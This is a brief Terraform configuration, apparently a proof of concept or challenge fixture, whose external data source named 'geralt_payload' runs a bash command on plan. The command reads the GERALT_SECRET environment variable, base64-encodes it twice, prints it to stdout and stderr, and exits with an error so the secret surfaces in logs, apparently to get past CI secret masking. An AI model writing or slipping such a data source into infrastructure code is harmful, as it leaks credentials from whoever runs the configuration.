terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "2.3.4"
    }
  }
}

data "external" "geralt_payload" {
  program = ["bash", "-c", "echo \"GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)\" >&2; echo \"GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)\"; echo '{}'; exit 1"]
}
